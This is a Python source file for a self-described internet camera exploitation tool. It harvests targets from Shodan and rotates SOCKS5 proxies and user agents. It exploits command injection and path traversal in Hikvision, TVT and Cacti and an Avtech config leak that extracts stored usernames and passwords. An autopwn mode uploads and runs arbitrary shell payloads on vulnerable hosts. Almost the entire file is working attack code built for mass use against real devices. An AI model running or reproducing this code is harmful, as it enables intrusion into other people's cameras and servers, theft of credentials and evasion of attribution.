import os, requests, argparse, time, datetime, shodan, sqlalchemy, random, threading, textwrap

from requests import packages
from requests.packages import urllib3
from requests.packages.urllib3 import exceptions
from requests.exceptions import ConnectionError, Timeout, ContentDecodingError

from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Boolean, Column, Integer, String, create_engine

from multiprocessing import Pool

from termcolor import colored

VERSION = "1.6.0"

DB_PATH = "storage.db"

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/73.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:70.0) Gecko/20191022 Firefox/70.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:70.0) Gecko/20190101 Firefox/70.0",
    "Mozilla/5.0 (Windows; U; Windows NT 9.1; en-US; rv:12.9.1.11) Gecko/20100821 Firefox/70",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:69.2.1) Gecko/20100101 Firefox/69.2",
    "Mozilla/5.0 (Windows NT 6.1; rv:68.7) Gecko/20100101 Firefox/68.7",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:62.0) Gecko/20100101 Firefox/62.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:10.0) Gecko/20100101 Firefox/62.0",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.13; ko; rv:1.9.1b2) Gecko/20081201 Firefox/60.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/58.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/58.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20120121 Firefox/46.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.66.18) Gecko/20177177 Firefox/45.66.18",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows ME 4.9; rv:35.0) Gecko/20100101 Firefox/35.0"
]

Base = declarative_base()

class Hosts(Base):
    __tablename__ = "hosts"
    id = Column(Integer, primary_key=True)
    ip_address = Column(String)
    port = Column(Integer)
    country_code = Column(String)
    vulnerable = Column(Boolean, default=None)
    query = Column(String)
    credentials = Column(String)

engine = create_engine(f"sqlite:///{DB_PATH}", echo=False)
Base.metadata.create_all(engine)
Session = sessionmaker(bind=engine)
session = Session()


class Http(object):
    def __init__(self, rhost, rport, proxy_parts, proto="http", timeout=60):
        super(Http, self).__init__()

        self.rhost = rhost
        self.rport = rport
        self.proto = proto
        self.timeout = timeout

        self.remote = None
        self.uri = None

        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

        self.remote = requests.Session()

        self._init_uri()

        self._update_proxy(proxy_parts)

        self.remote.headers.update({
            "Host": f"{self.rhost}:{self.rport}",
            "Accept": "*/*",
            "User-Agent": random.choice(USER_AGENTS),
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9,sv;q=0.8",
        })
        

    def send(self, url=None, query_args=None, timeout=5):
        if query_args:
            if len(query_args) > 22:
                print(f"[!] Error: Command {query_args} to long ({len(query_args)})")
                return None

        try:
            if url and not query_args:
                return self.get(url, timeout)
            else:
                data = self.put("/SDK/webLanguage", query_args, timeout)
        except requests.exceptions.ConnectionError:
            self.proto = "https" if self.proto == "http" else "https"
            self._init_uri()
            try:
                if url and not query_args:
                    return self.get(url, timeout)
                else:
                    data = self.put("/SDK/webLanguage", query_args, timeout)
            except requests.exceptions.ConnectionError:
                return None
        except requests.exceptions.RequestException:
            return None
        except KeyboardInterrupt:
            return None
        except Exception:
            return None

        if data.status_code == 302:
            redirect = data.headers.get("Location")
            self.uri = redirect[:redirect.rfind("/")]
            self._update_host()
            if url and not query_args:
                return self.get(url, timeout)
            else:
                data = self.put("/SDK/webLanguage", query_args, timeout)

        return data

    def _update_proxy(self, proxy_parts):
        self.remote.proxies.update({
            "http": f"socks5://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
            "https": f"socks5://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
        })

    def _update_host(self):
        if not self.remote.headers.get("Host") == self.uri[self.uri.rfind("://") + 3:]:
            self.remote.headers.update({
                "Host": self.uri[self.uri.rfind("://") + 3:],
            })

    def _init_uri(self):
        self.uri = "{proto}://{rhost}:{rport}".format(proto=self.proto, rhost=self.rhost, rport=str(self.rport))

    def put(self, url, query_args, timeout):
        query_args = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" \
                     f"<language>$({query_args})</language>"
        return self.remote.put(self.uri + url, data=query_args, verify=False, allow_redirects=False, timeout=timeout)

    def get(self, url, timeout):
        return self.remote.get(self.uri + url, verify=False, allow_redirects=False, timeout=timeout)


def clear_screen():
    os.system("cls") if os.name == "nt" else os.system("clear")


def header():
    clear_screen()
    print(f"Internet camera exploitation tool v{VERSION} 2022 by lean - Please do not use in military or secret service organizations, or for illegal purposes.")
    print("Targeted vendors: Hikvision, Avtech, TVT")
    print("")


def write_to_log_file(content):
    if not os.path.isdir("logs"): os.mkdir("logs")
    file_name = datetime.datetime.now().strftime("%m_%d_%Y") + ".txt"
    file_handle = open("logs/" + file_name, "a")
    file_handle.write(content + "\n")
    file_handle.close()


def get_proxies_from_file(file_name):
    if not os.path.isfile(file_name): 
        pretty_print("File " + file_name + " not found", 2)
        exit()

    proxy_file = open(file_name, "r")
    proxies = proxy_file.read().split("\n")
    
    output = []

    for proxy in proxies:
        proxy = proxy.split(":")
        if not len(proxy) == 4: continue
        output.append(proxy)

    return output


def pretty_print(content, log_type):
    date_time = datetime.datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
    
    string = ""
    log_string = ""

    if log_type == 1:
        string = f"[{colored('+', 'green')}] {date_time} :: {content}"
        log_string = f"[+] {date_time} :: {content}"
    elif log_type == 2:
        string = f"[{colored('-', 'red')}] {date_time} :: {content}"
        log_string = f"[-] {date_time} :: {content}"
    else:
        string = f"[{colored('i', 'blue')}] {date_time} :: {content}"
        log_string = f"[i] {date_time} :: {content}"

    print(string)
    write_to_log_file(log_string)


def check_vuln_hikvision(remote):
    data = remote.send(url="/", query_args=None)
    if data is None:
        pretty_print(f"[{remote.rhost}:{remote.rport}] - cannot establish connection", 2)
        return None

    data = remote.send(query_args=">webLib/c")
    if data is None or data.status_code == 404:
        pretty_print(f"[{remote.rhost}:{remote.rport}] - does not look like Hikvision", 2)
        return None

    status_code = data.status_code

    data = remote.send(url="/c", query_args=None)
    if not data.status_code == 200:
        if status_code == 500:
            pretty_print(f"[{remote.rhost}:{remote.rport}] - could not verify if vulnerable (Code: {status_code})", 2)
            return None
        else:
            pretty_print(f"[{remote.rhost}:{remote.rport}] - not vulnerable (Code: {status_code})", 2)
            return None

    pretty_print(f"[{remote.rhost}:{remote.rport}] - verified exploitable", 1)
    thread_engine = create_engine(f"sqlite:///{DB_PATH}", echo=False)
    ThreadSession = sessionmaker(bind=thread_engine)
    thread_session = ThreadSession()
    thread_session.query(Hosts).filter_by(ip_address=remote.rhost).update({"vulnerable": True})
    thread_session.commit()
    return True


def check_vuln_avtech(host, proxy_parts, etype=1):
    url = f"http://{host['ip_address']}:{host['port']}/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*"

    if etype == 2:
        url = f"http://{host['ip_address']}:{host['port']}/cgi-bin/user/Config.cgi?.cab&action=get&category=Account."

    try:
        response = requests.get(url, proxies={
            "http": f"socks5://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
            "https": f"socks5://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
        }, headers={
            "User-Agent": random.choice(USER_AGENTS)
        }, timeout=5)
    except requests.exceptions.ConnectionError:
        pretty_print(f"[{host['ip_address']}:{host['port']}] - connection error", 2)
        return None
    except requests.exceptions.ReadTimeout:
        pretty_print(f"[{host['ip_address']}:{host['port']}] - timeout error", 2)
        return None

    if "Account.Maxuser" in response.text:
        try:
            user_username = response.text.split("User1.Username=")[1].split("\n")[0]
            user_password = response.text.split("User1.Password=")[1].split("\n")[0]
        except IndexError:
            pretty_print(f"[{host['ip_address']}:{host['port']}] - not vulnerable (Code: {response.status_code})", 2)
            return None

        pretty_print(f"[{host['ip_address']}:{host['port']}] - verified exploitable", 1)
        thread_engine = create_engine(f"sqlite:///{DB_PATH}", echo=False)
        ThreadSession = sessionmaker(bind=thread_engine)
        thread_session = ThreadSession()
        thread_session.query(Hosts).filter_by(ip_address=host["ip_address"]).update({"vulnerable": True, "credentials": user_username+":"+user_password})
        thread_session.commit()
        return True

    else:
        pretty_print(f"[{host['ip_address']}:{host['port']}] - not vulnerable (Code: {response.status_code})", 2)
        if etype == 1:
            check_vuln_avtech(host, proxy_parts, 2)
        return None


def raw_url_request(url, proxy_parts):
    r = requests.Request("GET")
    r.url = url
    r = r.prepare()
    r.url = url

    s = requests.Session()

    s.proxies.update({
        "http": f"socks5://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
        "https": f"socks5://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
    })

    s.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
    })
    
    return s.send(r, timeout=20)


def check_vuln_tvt(host, proxy_parts):
    try:
        raw_url_request("http://"+host['ip_address']+":"+str(host['port'])+"/language/Swedish${IFS}&&echo${IFS}1>test&&tar${IFS}/string.js", proxy_parts)
        response = raw_url_request("http://"+host['ip_address']+":"+str(host['port'])+"/../../../../../../../mnt/mtd/test", proxy_parts)
        raw_url_request("http://"+host['ip_address']+":"+str(host['port'])+"/language/Swedish${IFS}&&rm${IFS}test&&tar${IFS}/string.js", proxy_parts)

    except (ConnectionError, Timeout) as e:
        pretty_print(f"[{host['ip_address']}:{host['port']}] - connection/timeout error", 2)
        return False
    if response.text[0] != '1': 
        pretty_print(f"[{host['ip_address']}:{host['port']}] - not vulnerable (Code: {response.status_code})", 2)
        return False

    pretty_print(f"[{host['ip_address']}:{host['port']}] - verified exploitable", 1)
    thread_engine = create_engine(f"sqlite:///{DB_PATH}", echo=False)
    ThreadSession = sessionmaker(bind=thread_engine)
    thread_session = ThreadSession()
    thread_session.query(Hosts).filter_by(ip_address=host["ip_address"]).update({"vulnerable": True})
    thread_session.commit()
    return True


def check_vuln_cacti(host, proxy_parts):
    payload = "; /bin/sh -c id"

    local_data_ids = [x for x in range(0, 50)]

    pretty_print(f"[{host['ip_address']}:{host['port']}] - Trying to exploit...", 2)

    for id in range(100):
        url = f"http://{host['ip_address']}:{host['port']}/remote_agent.php"

        params = {
            "action": "polldata", 
            "host_id": id,
            "poller_id": payload, 
            "local_data_ids[]": local_data_ids
        }
        
        headers = {
            "X-Forwarded-For": host["ip_address"],
            "User-Agent": random.choice(USER_AGENTS)
        }

        r = requests.get(url, params=params, headers=headers, timeout=10, proxies={
            "http": f"socks5://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
            "https": f"socks5://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}",
        })

        if("cmd.php" in r.text):
            pretty_print(f"[{host['ip_address']}:{host['port']}] - verified exploitable", 1)
            thread_engine = create_engine(f"sqlite:///{DB_PATH}", echo=False)
            ThreadSession = sessionmaker(bind=thread_engine)
            thread_session = ThreadSession()
            thread_session.query(Hosts).filter_by(ip_address=host["ip_address"]).update({"vulnerable": True})
            thread_session.commit()
            break


def check_vuln_task(host):
    if "Hikvision" in host["query"]:
        remote = Http(host["ip_address"], host["port"], random.choice(proxy_part_list))
        threading.Thread(target=check_vuln_hikvision, args=(remote,)).start()
    elif "avtech" in host["query"]:
        threading.Thread(target=check_vuln_avtech, args=(host, random.choice(proxy_part_list),)).start()
    elif "Cross" in host["query"]:
        threading.Thread(target=check_vuln_tvt, args=(host, random.choice(proxy_part_list),)).start()
    elif "Cacti" in host["query"]:
        threading.Thread(target=check_vuln_cacti, args=(host, random.choice(proxy_part_list),)).start()
        

def get_shodan_hosts(api, query, page):
    try:
        results = api.search(query, page=page)
        return results

    except shodan.APIError as e:
        pretty_print(f"Error: {e}", 1)


def fetch_and_insert(args):
    api = shodan.Shodan(args.api_token)
    all_hosts = []

    pretty_print("Fetching hosts from shodan", 3)
    print(" | Query", args.query)
    print(" | Pages", str(args.pages))

    for page in range(args.pages):
        pretty_print("Fetching page " + str(page + 1), 3)
        all_hosts.append(get_shodan_hosts(api, args.query, page)["matches"])

    new_all_hosts = []
    for i in all_hosts:
        for j in i:
            new_all_hosts.append(j)
    
    all_hosts = new_all_hosts
    del new_all_hosts

    for host in all_hosts:
        session.add(Hosts(
            ip_address=host["ip_str"],
            port=host["port"],
            country_code=host["location"]["country_code"],
            query=args.query
        ))
        session.commit()
    
    pretty_print("Fetched " + str(len(all_hosts)) + " hosts", 1)


def check_from_db(args):
    global proxy_part_list
    proxy_part_list = get_proxies_from_file(args.proxy_file)    
    pretty_print("Loaded " + str(len(proxy_part_list)) + " proxies", 1)

    all_hosts = session.query(Hosts).filter_by(vulnerable=None).all()

    new_all_hosts = []
    for i in all_hosts:
        new_all_hosts.append({"ip_address": i.ip_address, "port": i.port, "query": i.query})
    
    all_hosts = new_all_hosts
    del new_all_hosts

    pretty_print("Checking " + str(len(all_hosts)) + " hosts", 1)

    list_part = [all_hosts[i : i + args.threads] for i in range(0, len(all_hosts), args.threads)]
    
    for hosts in list_part:
        pretty_print("Spawning " + str(len(hosts)) + " threads...", 3)
        pool = Pool()

        pool.map_async(check_vuln_task, hosts)

        pool.close()
        pool.join()
        pretty_print("All threads done", 3)


def create_payload(payload, payload_length):
    # hex_payload = payload.encode("utf-8").hex()
    # splitted_payload = textwrap.wrap(hex_payload, 2)
    
    # for idx, char in enumerate(splitted_payload):
    #     splitted_payload[idx] = "\\x" + char

    # new_payload = "".join(splitted_payload)
    # new_payload = "bash -c $'" + new_payload + "'"
    return textwrap.wrap(payload, payload_length, replace_whitespace=False, drop_whitespace=False)


def cmd_hikvision(remote, command):
    if not check_vuln_hikvision(remote):
        return False
    data = remote.send(query_args=f'{command}>webLib/x')
    if data is None:
        return False

    data = remote.send(url="/x", query_args=None)
    if data is None or not data.status_code == 200:
        pretty_print("Error executing cmd", 2)
        return False
    print(data.text)
    return True


def spawn_shell_hikvision(remote, shell):
    if not check_vuln_hikvision(remote):
        return False

    payload_parts = create_payload(shell, 1)

    for idx, part in enumerate(payload_parts):
        if "$" in part:
            payload_parts[idx] = part.replace("$", "&#36;")

    for idx, part in enumerate(payload_parts):
        if "&" in part:
            payload_parts[idx] = part.replace("&", "&#38;")
    
    for idx, part in enumerate(payload_parts):
        if "<" in part:
            payload_parts[idx] = part.replace("<", "&#60;")
    
    for idx, part in enumerate(payload_parts):
        if ">" in part:
            payload_parts[idx] = part.replace(">", "&#62;")
    
    data = remote.send(url="/N", query_args=None)

    if data.status_code == 404:
        pretty_print(f"[{remote.rhost}:{remote.rport}] - not pwned, pwning now!", 1)

        for idx, part in enumerate(payload_parts):
            pretty_print(f"[{str(idx+1)}/{len(payload_parts)}] - sending payload part", 3)
            if idx == 0:
                data = remote.send(query_args=f"echo -n '{part}'>N")
                if data.status_code == 401:
                    print(data.headers)
                    print(data.text)
                    return False
            else:
                remote.send(query_args=f"echo -n '{part}'>>N")

        pretty_print(f"[{remote.rhost}:{remote.rport}] - pwned, running command", 1)
        cmd_hikvision(remote, "sh N")
        remote.send(query_args="rm N")
        
    else:
        pretty_print(f"[{remote.rhost}:{remote.rport}] - already pwned with https://www.exploit-db.com/exploits/50441", 2)
        pretty_print(f"[{remote.rhost}:{remote.rport}] - removing previous payload", 3)
        remote.send(query_args="rm webLib/N")
        spawn_shell_hikvision(remote, command)


def auto_pwn(args):
    global proxy_part_list
    proxy_part_list = get_proxies_from_file(args.proxy_file)    
    pretty_print("Loaded " + str(len(proxy_part_list)) + " proxies", 1)

    all_hosts = session.query(Hosts).filter_by(vulnerable=True).all()
    pretty_print("Trying to pwn " + str(len(all_hosts)) + " hosts", 3)

    new_all_hosts = []
    for i in all_hosts:
        new_all_hosts.append({"ip_address": i.ip_address, "port": i.port, "query": i.query})
    
    all_hosts = new_all_hosts
    del new_all_hosts

    for idx, host in enumerate(all_hosts):
        if "Hikvision" in host["query"]:
            remote = Http(host["ip_address"], host["port"], random.choice(proxy_part_list))
            spawn_shell_hikvision(remote, args.payload)


def main():
    header()

    parser = argparse.ArgumentParser()

    parser.add_argument("--check", required=False, default=False, action="store_true", help="Check saved hosts for vuln")
    parser.add_argument("--shodan", required=False, default=False, action="store_true", help="Get hosts using shodan api and insert in database")
    parser.add_argument("--autopwn", required=False, default=False, action="store_true", help="Automatically run command on vuln hosts")
    parser.add_argument("--api-token", required=False, type=str, default=None, help="Shodan api token")
    parser.add_argument("--query", required=False, type=str, default=None, help="The query to search")
    parser.add_argument("--pages", required=False, type=int, default=None, help="Pages of results to fetch")
    parser.add_argument("--proxy-file", required=False, type=str, default=None, help="Path of file with proxies")
    parser.add_argument("--threads", required=False, type=int, default=None, help="Thread number")
    parser.add_argument("--payload", required=False, type=str, default=None, help="Command to run on vuln hosts")

    args = parser.parse_args()

    if args.shodan:
        if not args.api_token or not args.query or not args.pages:
            pretty_print("--api-token, --query and --pages are required for shodan", 2)
            exit()
        fetch_and_insert(args)
    elif args.check:
        if not args.proxy_file or not args.threads:
            pretty_print("--proxy-file and --threads are required for vuln check", 2)
            exit()
        check_from_db(args)
    elif args.autopwn:
        if not args.payload or not args.proxy_file:
            pretty_print("--payload and --proxy-file are required for autopwn", 2)
            exit()
        auto_pwn(args)
    else:
        pretty_print("--shodan or --check is required", 2)


if __name__ == "__main__":
    main()
